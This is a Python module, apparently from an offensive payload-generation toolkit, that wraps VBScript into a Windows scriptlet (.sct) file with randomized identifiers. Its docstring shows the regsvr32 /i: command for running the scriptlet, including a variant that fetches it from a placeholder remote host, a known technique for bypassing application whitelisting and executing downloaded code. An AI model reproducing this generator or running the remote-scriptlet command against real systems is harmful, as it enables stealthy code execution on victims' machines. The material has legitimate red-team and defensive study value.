#!/usr/bin/env python
# encoding: utf-8

import random
import logging
from common.utils import randomAlpha
from modules.vbs_gen import VBSGenerator

SCT_TEMPLATE = \
r"""<?XML version="1.0"?>
<scriptlet>
<registration 
    progid="<<<random>>>"
    classid="{<<<CLS1>>>-0000-0000-0000-<<<CLS4>>>}" >
    <script language="VBScript">
        <![CDATA[
            <<<VBS>>>
            <<<MAIN>>>  
    
        ]]>
</script>
</registration>
</scriptlet>
"""

class SCTGenerator(VBSGenerator):
    """ Module used to generate SCT file from working dir content
    To execute: 
    regsvr32 /u /n /s /i:hello.sct scrobj.dll
    Also work on remote files
    
    regsvr32 /u /n /s /i:http://www.domain.blah/hello.sct scrobj.dll
    """
        
        
    def generate(self):
        logging.info(" [+] Generating %s file..." % self.outputFileType)
        self.vbScriptConvert()
        f = open(self.getMainVBAFile()+".vbs")
        vbsContent = f.read()
        f.close()
        
        vbsContent = vbsContent.replace("WScript.Echo ", "MsgBox ")
        
        # Write VBS in template
        sctContent = SCT_TEMPLATE
        sctContent = sctContent.replace("<<<random>>>", randomAlpha(8))
        sctContent = sctContent.replace("<<<CLS1>>>", ''.join([random.choice('0123456789ABCDEF') for x in range(8)]))  # @UnusedVariable
        sctContent = sctContent.replace("<<<CLS4>>>", ''.join([random.choice('0123456789ABCDEF') for x in range(12)]))  # @UnusedVariable
        sctContent = sctContent.replace("<<<VBS>>>", vbsContent)
        sctContent = sctContent.replace("<<<MAIN>>>", self.startFunction)
        # Write in new HTA file
        f = open(self.outputFilePath, 'w')
        f.writelines(sctContent)
        f.close()
        logging.info("   [-] Generated Scriptlet file: %s" % self.outputFilePath)
        logging.info("   [-] Test with : \nregsvr32 /u /n /s /i:%s scrobj.dll\n" % self.outputFilePath)
        
        
        
        
        